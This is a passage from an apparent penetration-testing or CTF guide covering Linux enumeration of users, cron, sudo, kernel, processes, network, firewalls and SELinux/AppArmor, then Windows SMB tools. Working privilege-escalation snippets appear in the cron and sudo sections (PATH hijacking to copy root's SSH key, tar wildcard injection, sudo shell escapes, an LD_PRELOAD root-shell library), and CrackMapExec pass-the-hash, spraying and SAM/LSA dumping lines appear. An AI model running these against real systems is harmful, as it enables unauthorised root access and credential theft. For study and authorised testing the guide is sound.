Understand service relationships and startup order:

```bash
systemctl list-dependencies service_name
systemctl list-dependencies --reverse service_name
cat /etc/systemd/system/multi-user.target.wants/
```

Services with mutual dependencies or circular relationships may create race conditions or exploitation vectors [Unverified] depending on specific system configurations.

---

## User Account Enumeration

User enumeration identifies system users, determines privilege levels, discovers interactive accounts, and maps user-to-service relationships for privilege escalation planning.

**Local User Discovery**

Extract user information from authentication databases:

```bash
cat /etc/passwd
cat /etc/shadow (requires root)
getent passwd
getent shadow (requires root)
```

The `/etc/passwd` file lists users accessible to unprivileged users; `/etc/shadow` contains password hashes and requires elevated privileges. Fields in `/etc/passwd`:

```
username:password_placeholder:UID:GID:GECOS:home_directory:login_shell
```

Identify interactive users (login_shell != /nologin or /false), system users (UID < 1000 typically on Linux), and service accounts.

**UID/GID Analysis**

Users with UID 0 possess root privileges. Unexpected root-equivalent UIDs indicate privilege escalation opportunities:

```bash
awk -F: '$3 == 0 {print $1}' /etc/passwd
```

Examine GID mappings for group-based privileges:

```bash
cat /etc/group
getent group
groups username
id username
```

Groups with GID 0 (root group) or capabilities-granting groups (docker, sudoers, wheel) enable privilege escalation.

**Home Directory and Shell Analysis**

Interactive users possess writable home directories and command interpreters:

```bash
ls -la /home/
ls -la /root/
grep -v /nologin /etc/passwd | grep -v /false
```

Home directories contain configuration files, credentials, SSH keys, and application data. Examine shell types to understand user capabilitiesâ€”service accounts use `/bin/false` or `/usr/sbin/nologin` [Inference] preventing interactive login though [Unverified] specific shells and their restrictions depend on configuration.

**SSH Key Enumeration**

Discover SSH keypairs for lateral movement:

```bash
find /home -name "*.pub" 2>/dev/null
find /home -name "id_rsa" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
find /root -name ".ssh" -type d 2>/dev/null
cat ~/.ssh/authorized_keys
cat ~/.ssh/config
```

Analyze SSH configuration for host aliases, port forwarding, identity file specifications, and proxy jump configurations.

**Sudo Privilege Analysis**

Determine privilege escalation paths via sudo:

```bash
sudo -l
sudo -l -U targetuser
cat /etc/sudoers (usually requires root)
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*
```

Output format shows commands users can execute with elevated privileges:

```
(ALL) ALL           â€” execute any command as any user
(root) NOPASSWD     â€” execute as root without password prompt
(ALL) /bin/cat      â€” execute only /bin/cat as any user
```

Note NOPASSWD entries and command wildcards enabling privilege escalation. Analyze wrapped commands for [Inference] potential bypass techniques through argument manipulation or environment variable abuse, though actual bypass feasibility depends on specific sudo version and command implementation.

**Password Policy and Account Aging**

Examine authentication constraints:

```bash
cat /etc/login.defs
cat /etc/shadow | cut -d: -f1,3,4,5,6,7,8,9
chage -l username
```

The `/etc/shadow` file fields (after username and hash):

```
last_changed:min_days:max_days:warn_days:inactive_days:expire_date:reserved
```

Inactive accounts or those with expired passwords represent potential dormant access points.

**Service Account Identification**

Map services to user accounts:

```bash
ps aux | awk '{print $1}' | sort -u
systemctl list-units --type=service --all | grep -oE 'User=\w+' | cut -d= -f2 | sort -u
grep -E '^[a-z_][a-z0-9_-]*\$' /etc/passwd
```

Service accounts running security-critical applications (web servers, databases, monitoring tools) represent privilege escalation targets when vulnerable services run under these accounts.

**Historical User Activity**

Identify recently active or suspicious accounts:

```bash
lastlog
last
lastb
w
who
```

The `lastlog` command displays last login information per user. Compare against current system time to identify dormant accounts. `lastb` shows failed login attempts (typically requires root access to `/var/log/btmp`).

**Privilege Escalation Path Mapping**

Correlate users with exploitable configurations [Inference] such as users in group memberships enabling docker access, users with scheduled tasks under cron, or users with capabilities assigned via `setcap`. Concrete exploitation depends on specific system configuration, installed packages, and running services.

## Cron Job Discovery

Cron jobs represent persistent execution mechanisms often exploitable through insecure task scheduling, world-writable scripts, or path manipulation vulnerabilities.

**System-Wide Cron Configuration**

The primary cron configuration directory is `/etc/cron.d/`, containing system-level scheduled tasks that execute with specific user privileges defined in the sixth field.

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

Examine `/etc/crontab` for the default system scheduler configuration:

```bash
cat /etc/crontab
```

**Time-Based Cron Directories**

Cron provides pre-configured execution directories for hourly, daily, weekly, and monthly tasks:

```bash
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

These directories often contain world-readable scripts executed with elevated privileges. Check permissions and ownership:

```bash
find /etc/cron.* -type f -exec ls -la {} \;
find /etc/cron.* -type f -perm -002 -exec ls -la {} \;
```

The `-002` permission flag identifies world-writable files, indicating potential privilege escalation vectors.

**User-Specific Cron Jobs**

Each user maintains individual cron configurations in `/var/spool/cron/crontabs/` (Linux) or `/var/cron/tabs/` (some BSD systems). Read access requires root or ownership:

```bash
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/$USER
```

Enumerate all user cron jobs by iterating through readable entries:

```bash
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
```

**Cron Log Analysis**

Examine historical cron execution through system logs, typically stored in `/var/log/cron` (RHEL/CentOS) or `/var/log/syslog` (Debian/Ubuntu):

```bash
grep CRON /var/log/syslog
grep "cron\[" /var/log/syslog | tail -100
journalctl -u cron --since "1 hour ago"
```

**Exploitation Methodology**

Identify exploitable cron jobs through these characteristics:

- **World-writable script targets**: Scripts executed by root but writable by unprivileged users
    
    ```bash
    find / -type f -writable -executable 2>/dev/null | while read file; do grep -l "$(basename $file)" /etc/cron.* 2>/dev/null && echo "$file"; done
    ```
    
- **Relative path execution**: Cron jobs using relative paths instead of absolute paths, enabling PATH manipulation
    
    ```bash
    grep -h "^[^#]" /etc/crontab | grep -v "^[[:space:]]*$" | grep -E "^\s*[^/]"
    ```
    
- **Unquoted variable expansion**: Cron commands with unquoted variables vulnerable to command injection
    
    ```bash
    grep -h "^[^#]" /etc/cron.d/* | grep '\$'
    ```
    

**PATH Hijacking Example**: If a cron job executes `backup.sh` without full path, create a malicious `backup.sh` in a directory earlier in the cron's PATH:

```bash
echo '#!/bin/bash' > /tmp/backup.sh
echo 'cat /root/.ssh/id_rsa > /tmp/root_key' >> /tmp/backup.sh
chmod +x /tmp/backup.sh
export PATH=/tmp:$PATH
```

**Wildcard Expansion Vulnerability**: Cron jobs using wildcards (e.g., `tar czf archive.tar.gz *`) are vulnerable to argument injection through specially-crafted filenames:

```bash
cd /target/directory
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=id'
```

## SUDO Privilege Enumeration

SUDO misconfigurations represent the most common privilege escalation vector in CTF scenarios and production systems.

**Sudoers Configuration Review**

The primary configuration file `/etc/sudoers` defines privilege delegation. Parse it with validated tools to prevent syntax errors:

```bash
sudoedit /etc/sudoers
sudo -l
sudo -l -U root
```

The `-l` flag lists all SUDO commands executable by the current user:

```bash
sudo -l
# Output example:
# User victim may run the following commands on target:
#     (root) NOPASSWD: /usr/bin/find
#     (www-data) /usr/bin/python3
```

**Sudoers Directory Analysis**

Additional sudoers configurations in `/etc/sudoers.d/` supplement the main file:

```bash
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*
```

**Capability-Based Privilege Analysis**

Extract privilege information from sudoers output systematically:

```bash
sudo -l 2>/dev/null | grep -E "^\s*\(" | sed 's/.*(\([^)]*\)).*/\1/'
```

**NOPASSWD Exploitation**

Commands executable without password authentication represent immediate escalation paths:

```bash
sudo -l | grep NOPASSWD
# If NOPASSWD is present, execute directly:
sudo /path/to/command
```

**Wildcard Exploitation in Sudoers**

Sudoers entries using wildcards can be exploited through path manipulation:

```bash
sudo -l | grep '*'
# Example: (root) /usr/bin/script.sh *
# Exploit: sudo /usr/bin/script.sh /root/.ssh/id_rsa
```

**Command Parameter Exploitation**

Commands with user-controlled parameters enable command injection:

```bash
# If sudoers allows: (root) /usr/bin/find
# Exploit find's command execution:
sudo find / -exec cat /root/flag.txt \;
sudo find / -exec /bin/bash \;

# If sudoers allows: (root) /usr/bin/python3
# Exploit Python for shell access:
sudo python3 -c "import os; os.system('/bin/bash')"
```

**Environment Variable Exploitation**

[Inference] SUDO can be configured to preserve environment variables through `env_keep` or `env_reset` settings. Test inherited variables:

```bash
sudo -l 2>/dev/null | grep -i env
env -i sudo -l  # Test with clean environment
```

If `LD_LIBRARY_PATH` or `LD_PRELOAD` are preserved, create malicious shared objects:

```bash
cat > /tmp/exploit.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/vulnerable_cmd
```

**Sudo Version Exploitation**

Identify SUDO version and cross-reference known CVEs:

```bash
sudo --version
# Output: Sudo version 1.8.21p2
```

[Unverified] CVE databases should be consulted for version-specific vulnerabilities, as behavior varies significantly across SUDO versions prior to 1.9.x.

**Privilege Escalation from Restricted User Context**

If a specific user can execute privileged commands:

```bash
sudo -u www-data /usr/bin/python3 -c "import os; os.system('/bin/bash')"
# Now execute privileged commands as www-data
```

## Kernel Version Detection

Kernel vulnerabilities often provide direct privilege escalation paths, particularly in older or unpatched systems.

**Kernel Version Extraction**

```bash
uname -a
uname -r
cat /proc/version
cat /etc/os-release
hostnamectl
```

**Detailed Kernel Information**

```bash
cat /proc/cmdline
dmesg | head -20
```

**Architecture and Capability Detection**

```bash
uname -m
getconf LONG_BIT
ldd /bin/ls | grep libc
file /bin/ls
```

Identifies 32-bit vs. 64-bit systems and ASLR/DEP capabilities.

**Kernel Module Analysis**

```bash
lsmod
cat /proc/modules
modinfo module_name
```

Custom or vulnerable kernel modules represent exploitation vectors.

**CVE Correlation and Exploitation**

Document the exact kernel version:

```bash
uname -r
# Example output: 4.4.0-21-generic
```

Cross-reference against known vulnerability databases:

- **Dirty COW** (CVE-2016-5195): Affects kernels < 4.8.3
- **Dirty Pipe** (CVE-2022-0847): Affects kernels 5.8-5.15
- **PwnKit** (CVE-2021-4034): Affects pkexec across multiple versions

[Unverified] Specific exploitation feasibility depends on additional system factors including SELinux/AppArmor status, available compilers, and runtime restrictions.

Automated enumeration scripts like `linux-exploit-suggester.sh` correlate kernel versions to exploits:

```bash
./linux-exploit-suggester.sh
```

[Inference] Such tools generate candidates rather than confirmed exploitable vulnerabilities; manual verification of each CVE's applicability is required.

## Package Manager Analysis

Package managers reveal installed software versions, missing security patches, and dependency chains for privilege escalation.

**Distribution Identification**

```bash
cat /etc/os-release
lsb_release -a
cat /etc/issue
cat /etc/*-release
```

Determines appropriate package manager (apt, yum, pacman, etc.).

**Package Manager Detection**

```bash
which apt apt-get yum dnf pacman zypper
dpkg --version
rpm --version
```

**Installed Package Enumeration**

Debian/Ubuntu-based systems:

```bash
dpkg -l
apt list --installed
apt-cache search .
```

Red Hat/CentOS-based systems:

```bash
rpm -qa
yum list installed
dnf list installed
```

Arch-based systems:

```bash
pacman -Q
pacman -Ss
```

**Package Version Extraction**

```bash
dpkg -l | grep package_name
rpm -q package_name
apt-cache policy package_name
```

**Dependency Chain Analysis**

Identify package dependencies that might contain vulnerabilities:

```bash
apt-cache depends package_name
apt-cache rdepends package_name
rpm -qR package_name
```

**Security Update Status**

```bash
apt update && apt list --upgradable
yum check-update
dnf check-update
sudo unattended-upgrade -d
```

Lists available security patches and identifies unpatched systems.

**Vulnerable Package Identification**

Query for known vulnerable versions:

```bash
apt-cache policy openssh-server
dpkg -l | grep -E "sudo|openssh|apache|nginx|mysql"
```

Compare against CVE databases for exploitation vectors.

**Package File Ownership Analysis**

Identify misconfigured package installations with exploitable permissions:

```bash
dpkg -L package_name | xargs ls -la
rpm -ql package_name | xargs ls -la 2>/dev/null
```

Look for world-writable or world-readable sensitive files.

**Custom/Manually Installed Software**

Locate software not managed by package managers:

```bash
find /opt -type f -executable 2>/dev/null
find /usr/local -type f -executable 2>/dev/null
ls -la /root/
find /home -name "*.sh" -o -name "*.py" 2>/dev/null
```

These often contain unpatched or beta versions with known vulnerabilities.

**Package Source Configuration**

```bash
cat /etc/apt/sources.list
ls -la /etc/apt/sources.list.d/
cat /etc/yum.repos.d/*
```

Identifies third-party repositories that may contain backdoored or vulnerable packages.

---

## Process Enumeration

### Core Process Discovery

**Basic Process Listing**

```bash
ps aux
ps -ef
ps auxf  # Tree view with process hierarchy
```

**Detailed Process Information**

```bash
ps -eo pid,ppid,cmd,user,group,%cpu,%mem,stat,start
ps -p <PID> -o pid,ppid,user,args,wchan
```

**Process Tree Visualization**

```bash
pstree -p  # Show PIDs
pstree -a  # Show command line arguments
pstree -u  # Show user transitions
```

**Real-time Process Monitoring**

```bash
top
htop  # Enhanced interactive viewer
atop  # Advanced system resource monitor
```

**Process File Descriptors**

```bash
lsof -p <PID>  # Files opened by specific process
lsof -u <username>  # Files opened by user
lsof -i  # Network connections
lsof +D /path  # All processes using directory
```

**Process Command Lines and Environment**

```bash
cat /proc/<PID>/cmdline | tr '\0' ' '
cat /proc/<PID>/environ | tr '\0' '\n'
strings /proc/<PID>/environ
```

**Process Memory Maps**

```bash
cat /proc/<PID>/maps
pmap <PID>
pmap -x <PID>  # Extended information
```

**Process Limits and Status**

```bash
cat /proc/<PID>/limits
cat /proc/<PID>/status
cat /proc/<PID>/stat
```

**Socket and Network Process Relationships**

```bash
ss -tulpn  # Shows process information with sockets
netstat -tulpn | grep <PID>
fuser -v <port>/tcp
```

**Process Capabilities**

```bash
getpcaps <PID>
cat /proc/<PID>/status | grep Cap
capsh --decode=<capability_hex>
```

**Identifying Interesting Processes**

```bash
# Processes running as root
ps aux | grep ^root

# Processes with open network connections
lsof -i -n -P

# Processes running from unusual locations
ps aux | grep -E '(/tmp|/dev/shm|/var/tmp)'

# Processes with SUID/SGID bits
ps -eo pid,user,group,args | grep -v "^root"
```

**Scheduled Tasks via Process Analysis**

```bash
ps aux | grep cron
cat /proc/$(pgrep cron)/cmdline
```

## Network Configuration Analysis

### Interface Enumeration

**Network Interfaces**

```bash
ip addr show
ip link show
ifconfig -a
cat /proc/net/dev
ls /sys/class/net/
```

**Interface Statistics**

```bash
ip -s link
netstat -i
cat /proc/net/netstat
cat /proc/net/snmp
```

### Routing and Network Paths

**Routing Tables**

```bash
ip route show
route -n
netstat -rn
cat /proc/net/route
```

**IP Forwarding Status**

```bash
cat /proc/sys/net/ipv4/ip_forward
sysctl net.ipv4.ip_forward
```

**IPv6 Configuration**

```bash
ip -6 addr show
ip -6 route show
cat /proc/sys/net/ipv6/conf/all/forwarding
```

### Active Connections and Listening Ports

**Socket Statistics**

```bash
ss -tunapl  # All TCP/UDP sockets with process info
ss -tulpn  # Listening ports
ss -tanp  # TCP connections
ss -o state established  # Established connections with timers
```

**Legacy netstat Commands**

```bash
netstat -tunapl
netstat -tulpn
netstat -anp | grep ESTABLISHED
```

**Connection State Analysis**

```bash
ss -tan | awk '{print $1}' | sort | uniq -c  # Count by state
ss dst :443  # Connections to specific port
ss sport = :ssh  # Connections from specific port
```

### ARP and Neighbor Discovery

**ARP Cache**

```bash
ip neigh show
arp -an
cat /proc/net/arp
```

**ARP Cache for Specific Interface**

```bash
ip neigh show dev eth0
```

### DNS Configuration

**DNS Resolvers**

```bash
cat /etc/resolv.conf
cat /etc/hosts
systemd-resolve --status  # systemd-resolved systems
resolvectl status
```

**DNS Cache (if present)**

```bash
systemd-resolve --statistics
nscd -g  # Name Service Cache Daemon
```

### Network Service Detection

**Identifying Network Services**

```bash
ss -tulpn | column -t
lsof -i -P -n
fuser -v -n tcp <port>
```

**Xinetd/Inetd Services**

```bash
cat /etc/inetd.conf
ls /etc/xinetd.d/
cat /etc/xinetd.d/*
```

**Systemd Socket Units**

```bash
systemctl list-sockets
systemctl list-units --type=socket
```

### Network Configuration Files

**Primary Configuration Locations**

```bash
cat /etc/network/interfaces  # Debian/Ubuntu
cat /etc/sysconfig/network-scripts/ifcfg-*  # RHEL/CentOS
cat /etc/netplan/*.yaml  # Ubuntu 18.04+
nmcli connection show  # NetworkManager
```

**Hostname Configuration**

```bash
hostname
hostnamectl
cat /etc/hostname
cat /etc/hosts
```

### Network Kernel Parameters

**TCP/IP Stack Parameters**

```bash
sysctl -a | grep net
cat /proc/sys/net/ipv4/tcp_*
cat /proc/sys/net/core/*
```

**Specific Security-Relevant Parameters**

```bash
cat /proc/sys/net/ipv4/conf/all/accept_source_route
cat /proc/sys/net/ipv4/conf/all/accept_redirects
cat /proc/sys/net/ipv4/icmp_echo_ignore_all
cat /proc/sys/net/ipv4/tcp_syncookies
```

## Firewall Rule Discovery

### iptables Analysis

**Listing All Rules**

```bash
iptables -L -n -v  # All chains, numeric, verbose
iptables -S  # Rules in save format
iptables -L -n -v --line-numbers  # With line numbers
```

**Chain-Specific Analysis**

```bash
iptables -L INPUT -n -v
iptables -L OUTPUT -n -v
iptables -L FORWARD -n -v
```

**NAT Rules**

```bash
iptables -t nat -L -n -v
iptables -t nat -L PREROUTING -n -v
iptables -t nat -L POSTROUTING -n -v
```

**Mangle and Raw Tables**

```bash
iptables -t mangle -L -n -v
iptables -t raw -L -n -v
```

**IPv6 Firewall**

```bash
ip6tables -L -n -v
ip6tables -S
```

**Rule Persistence Detection**

```bash
cat /etc/iptables/rules.v4
cat /etc/iptables/rules.v6
cat /etc/sysconfig/iptables  # RHEL/CentOS
iptables-save
ip6tables-save
```

### nftables Analysis

**Listing nftables Rules**

```bash
nft list ruleset
nft list tables
nft list table inet filter
nft list chain inet filter input
```

**Exporting Configuration**

```bash
nft -a list ruleset  # With handles
nft -j list ruleset  # JSON format
```

**Configuration Files**

```bash
cat /etc/nftables.conf
ls /etc/nftables/
```

### UFW (Uncomplicated Firewall)

**UFW Status and Rules**

```bash
ufw status verbose
ufw status numbered
ufw show raw
```

**UFW Configuration Files**

```bash
cat /etc/ufw/ufw.conf
cat /etc/ufw/before.rules
cat /etc/ufw/after.rules
cat /etc/ufw/user.rules
cat /etc/default/ufw
ls /etc/ufw/applications.d/
```

### firewalld Analysis

**Current Configuration**

```bash
firewall-cmd --list-all
firewall-cmd --list-all-zones
firewall-cmd --get-active-zones
firewall-cmd --list-services
firewall-cmd --list-ports
```

**Zone-Specific Details**

```bash
firewall-cmd --zone=public --list-all
firewall-cmd --info-zone=public
```

**Direct Rules**

```bash
firewall-cmd --direct --get-all-rules
firewall-cmd --direct --get-all-chains
```

**Rich Rules**

```bash
firewall-cmd --list-rich-rules
firewall-cmd --zone=public --list-rich-rules
```

**Configuration Files**

```bash
ls /etc/firewalld/zones/
cat /etc/firewalld/firewalld.conf
ls /usr/lib/firewalld/services/
```

### Connection Tracking

**Conntrack Analysis**

```bash
conntrack -L  # List connections
conntrack -L -o extended
cat /proc/net/nf_conntrack
conntrack -S  # Statistics
```

### Low-Level Firewall Detection

**Kernel Modules**

```bash
lsmod | grep -E 'ip_tables|nf_|iptable|ip6'
lsmod | grep -E 'nf_tables|nft'
```

**Loaded Netfilter Hooks**

```bash
cat /proc/net/netfilter/nfnetlink_queue
ls /proc/sys/net/netfilter/
```

**Checking for Filtering Without Direct Access**

```bash
# Port scanning localhost to detect filtering
nc -zv localhost 1-1000

# Testing specific ports
echo "test" | nc -v localhost <port>

# Checking packet drops
iptables -L -n -v -x | grep DROP
nft list ruleset | grep drop
```

## SELinux/AppArmor Detection

### SELinux Enumeration

**SELinux Status**

```bash
getenforce  # Current mode: Enforcing/Permissive/Disabled
sestatus  # Detailed status
cat /etc/selinux/config  # Boot configuration
```

**SELinux Contexts**

```bash
ls -Z /path/to/file  # File context
ps -eZ  # Process contexts
id -Z  # Current user context
```

**SELinux Policies**

```bash
seinfo  # Policy information
seinfo -t  # All types
seinfo -r  # All roles
sesearch --allow  # Allow rules
sesearch --allow -s <source_type> -t <target_type>
```

**SELinux Booleans**

```bash
getsebool -a  # All booleans
getsebool <boolean_name>
semanage boolean -l  # With descriptions
```

**SELinux Denials**

```bash
ausearch -m avc -ts recent  # Recent denials
grep AVC /var/log/audit/audit.log
sealert -a /var/log/audit/audit.log  # Human-readable
journalctl -t setroubleshoot
```

**SELinux Port Contexts**

```bash
semanage port -l  # Port type definitions
semanage port -l | grep <port>
```

**SELinux File Contexts**

```bash
semanage fcontext -l
matchpathcon /path/to/file  # Expected context
restorecon -nv /path/to/file  # Show what would change
```

**SELinux User Mappings**

```bash
semanage login -l
semanage user -l
```

**SELinux Modules**

```bash
semodule -l  # List loaded modules
semodule --list-modules=full
```

**Checking for SELinux Bypass Opportunities**

```bash
# Files in wrong contexts
find / -context *:user_home_t:* 2>/dev/null
find / -context *:httpd_sys_script_exec_t:* 2>/dev/null

# Writable locations with executable contexts
find / -writable -context *:bin_t:* 2>/dev/null

# Permissive domains
semanage permissive -l
semodule -l | grep permissive
```

### AppArmor Enumeration

**AppArmor Status**

```bash
aa-status  # Detailed status
systemctl status apparmor
cat /sys/module/apparmor/parameters/enabled
```

**AppArmor Profiles**

```bash
ls /etc/apparmor.d/
aa-status --profiled  # Profiles in enforce mode
aa-status --complaining  # Profiles in complain mode
```

**AppArmor Mode Detection**

```bash
cat /sys/kernel/security/apparmor/profiles
aa-status --json
```

**Process Confinement**

```bash
ps auxZ | grep -v unconfined
cat /proc/<PID>/attr/current  # Process AppArmor label
```

**AppArmor Denials**

```bash
dmesg | grep -i apparmor
grep DENIED /var/log/syslog
grep DENIED /var/log/audit/audit.log
journalctl | grep -i apparmor | grep -i denied
```

**Profile Analysis**

```bash
cat /etc/apparmor.d/<profile>
aa-logprof  # Interactive log analysis
aa-genprof  # Generate profile
```

**AppArmor Capabilities**

```bash
grep capability /etc/apparmor.d/*
```

**Checking Profile Enforcement**

```bash
# Complain mode profiles (less restrictive)
aa-status | grep complain

# Enforce mode profiles
aa-status | grep enforce

# Unconfined processes
aa-unconfined
aa-unconfined --paranoid
```

### Combined MAC System Detection

**Detect Active MAC System**

```bash
if [ -d /sys/kernel/security/selinux ]; then
    echo "SELinux detected"
    getenforce
elif [ -d /sys/kernel/security/apparmor ]; then
    echo "AppArmor detected"
    aa-status
else
    echo "No MAC system detected"
fi
```

**Check Kernel LSM Support**

```bash
cat /sys/kernel/security/lsm  # Loaded security modules
cat /proc/cmdline | grep security  # Boot parameters
```

**Audit Framework Status**

```bash
auditctl -s  # Audit daemon status
auditctl -l  # Current audit rules
cat /etc/audit/audit.rules
```

### Exploitation Considerations

**SELinux Pivot Points**

- Processes running in `unconfined_t` domain
- Custom policy modules with overly permissive rules
- Type transitions that can be triggered
- Booleans that weaken security when enabled
- File contexts on writable directories allowing execution

**AppArmor Weaknesses**

- Profiles in complain mode provide no enforcement
- Overly broad file path patterns (`/*` wildcards)
- Missing profile coverage on critical binaries
- Capabilities granted without necessity
- Link traversal permissions allowing escapes

**Common Bypass Techniques**

```bash
# SELinux: Check for permissive domains
sesearch --allow -s unconfined_t

# AppArmor: Unconfined processes
ps auxZ | grep unconfined

# Check for disabled MAC at boot
cat /proc/cmdline | grep -E 'selinux=0|apparmor=0|security='
```

## Critical Files and Locations

**Configuration Discovery**

```bash
/etc/selinux/
/etc/apparmor.d/
/proc/net/
/proc/sys/net/
/sys/class/net/
/etc/iptables/
/etc/firewalld/
/etc/ufw/
```

**Log Analysis**

```bash
/var/log/audit/audit.log
/var/log/messages
/var/log/syslog
/var/log/kern.log
journalctl -k  # Kernel messages
```

## Automated Enumeration Scripts

**LinPEAS Detection**

```bash
# LinPEAS automatically checks:
# - Active firewall rules
# - SELinux/AppArmor status
# - Network configuration
# - Process enumeration
```

**LinEnum Coverage**

```bash
# LinEnum provides:
# - Process listing with full paths
# - Network statistics
# - Firewall rule dumps
# - MAC system detection
```

**Manual Script Template**

```bash
#!/bin/bash
echo "[*] Process enumeration"
ps auxf
echo "[*] Network configuration"
ip addr; ip route
echo "[*] Firewall rules"
iptables -L -n -v 2>/dev/null || nft list ruleset 2>/dev/null
echo "[*] MAC system"
getenforce 2>/dev/null || aa-status 2>/dev/null
```

---

# Windows-Specific Enumeration

Windows environments present unique enumeration opportunities through protocols like SMB, LDAP, and Active Directory services. Understanding these systems is critical for CTF challenges and penetration testing in enterprise networks.

## SMB Enumeration

Server Message Block (SMB) is a network file sharing protocol primarily used in Windows environments. SMB enumeration reveals shares, users, groups, and system information.

### SMB Protocol Versions

- **SMBv1** - Legacy, vulnerable (MS17-010/EternalBlue)
- **SMBv2** - Windows Vista/Server 2008+
- **SMBv3** - Windows 8/Server 2012+, encrypted

**Identify SMB version:**

```bash
# Nmap script
nmap -p 445 --script smb-protocols 192.168.1.10

# Metasploit
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run

# Manual (smbclient)
smbclient -L //192.168.1.10 -N
```

### Nmap SMB Scripts

```bash
# Comprehensive SMB scan
nmap -p 139,445 --script smb-* 192.168.1.10

# OS discovery
nmap -p 445 --script smb-os-discovery 192.168.1.10

# Security mode detection
nmap -p 445 --script smb-security-mode 192.168.1.10

# Share enumeration
nmap -p 445 --script smb-enum-shares 192.168.1.10
nmap -p 445 --script smb-enum-shares --script-args smbusername=user,smbpassword=pass 192.168.1.10

# User enumeration
nmap -p 445 --script smb-enum-users 192.168.1.10

# Domain enumeration
nmap -p 445 --script smb-enum-domains 192.168.1.10

# Group enumeration
nmap -p 445 --script smb-enum-groups 192.168.1.10

# Session enumeration
nmap -p 445 --script smb-enum-sessions 192.168.1.10

# Check for vulnerabilities
nmap -p 445 --script smb-vuln-* 192.168.1.10

# Specific vulnerability checks
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10  # EternalBlue
nmap -p 445 --script smb-vuln-ms08-067 192.168.1.10
```

### enum4linux

Comprehensive SMB enumeration tool:

```bash
# Full enumeration
enum4linux -a 192.168.1.10

# Basic information
enum4linux -U 192.168.1.10  # Users
enum4linux -S 192.168.1.10  # Shares
enum4linux -G 192.168.1.10  # Groups
enum4linux -P 192.168.1.10  # Password policy

# Detailed enumeration
enum4linux -u administrator -p password -a 192.168.1.10

# RID cycling (user enumeration via RID)
enum4linux -r 192.168.1.10

# Specific RID range
enum4linux -R 500-550 192.168.1.10

# Get domain information
enum4linux -n 192.168.1.10

# Get printer information
enum4linux -i 192.168.1.10

# Verbose output
enum4linux -v 192.168.1.10
```

**enum4linux-ng (modernized version):**

```bash
# Install
pip3 install enum4linux-ng

# Basic scan
enum4linux-ng 192.168.1.10

# With credentials
enum4linux-ng -u administrator -p password 192.168.1.10

# All enumeration
enum4linux-ng -A 192.168.1.10

# JSON output
enum4linux-ng -oJ output.json 192.168.1.10
```

### SMBClient

Native Samba client for SMB interaction:

```bash
# List shares (null session)
smbclient -L //192.168.1.10 -N

# List shares (with credentials)
smbclient -L //192.168.1.10 -U username

# Connect to specific share
smbclient //192.168.1.10/sharename -N
smbclient //192.168.1.10/sharename -U username

# Connect with password
smbclient //192.168.1.10/sharename -U username%password

# Execute command without interactive session
smbclient //192.168.1.10/sharename -U username -c 'ls'

# Download file
smbclient //192.168.1.10/sharename -U username -c 'get file.txt'

# Upload file
smbclient //192.168.1.10/sharename -U username -c 'put localfile.txt'

# Recursive download
smbclient //192.168.1.10/sharename -U username -c 'prompt OFF; recurse ON; mget *'
```

**Interactive smbclient commands:**

```
smb: \> ls              # List files
smb: \> cd directory    # Change directory
smb: \> get file.txt    # Download file
smb: \> put file.txt    # Upload file
smb: \> mget *.txt      # Download multiple files
smb: \> del file.txt    # Delete file
smb: \> mkdir newdir    # Create directory
smb: \> rmdir olddir    # Remove directory
smb: \> !command        # Execute local shell command
smb: \> exit            # Exit
```

### SMBMap

SMB share enumeration and interaction:

```bash
# List shares
smbmap -H 192.168.1.10

# With credentials
smbmap -H 192.168.1.10 -u username -p password

# Domain authentication
smbmap -H 192.168.1.10 -d DOMAIN -u username -p password

# List contents recursively
smbmap -H 192.168.1.10 -u username -p password -r

# Specific share recursion
smbmap -H 192.168.1.10 -u username -p password -r 'C$'

# Execute command
smbmap -H 192.168.1.10 -u username -p password -x 'ipconfig'

# Download file
smbmap -H 192.168.1.10 -u username -p password --download 'share/path/file.txt'

# Upload file
smbmap -H 192.168.1.10 -u username -p password --upload '/local/file.txt' 'share/path/file.txt'

# Search for files
smbmap -H 192.168.1.10 -u username -p password -A password  # Files containing "password"
smbmap -H 192.168.1.10 -u username -p password -q  # Don't print banner

# Check permissions
smbmap -H 192.168.1.10 -u username -p password -r --depth 5
```

### CrackMapExec (CME)

Swiss Army knife for Windows/Active Directory networks:

```bash
# SMB enumeration
crackmapexec smb 192.168.1.10

# Multiple targets
crackmapexec smb 192.168.1.0/24

# With credentials
crackmapexec smb 192.168.1.10 -u username -p password

# Password spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-hash
crackmapexec smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Enumerate shares
crackmapexec smb 192.168.1.10 -u username -p password --shares

# Enumerate users
crackmapexec smb 192.168.1.10 -u username -p password --users

# Enumerate groups
crackmapexec smb 192.168.1.10 -u username -p password --groups

# Enumerate logged on users
crackmapexec smb 192.168.1.10 -u username -p password --loggedon-users

# Enumerate sessions
crackmapexec smb 192.168.1.10 -u username -p password --sessions

# Execute commands
crackmapexec smb 192.168.1.10 -u username -p password -x 'whoami'

# Execute PowerShell
crackmapexec smb 192.168.1.10 -u username -p password -X '$PSVersionTable'

# Dump SAM database
crackmapexec smb 192.168.1.10 -u username -p password --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.10 -u username -p password --lsa

# Check if user is admin
crackmapexec smb 192.168.1.10 -u username -p password
# Look for (Pwn3d!) indicator
```

### rpcclient

Windows RPC client for enumeration:

```bash
# Connect with null session
rpcclient -U "" -N 192.168.1.10

# Connect with credentials
rpcclient -U username 192.168.1.10

# Connect with password
rpcclient -U username%password 192.168.1.10
```

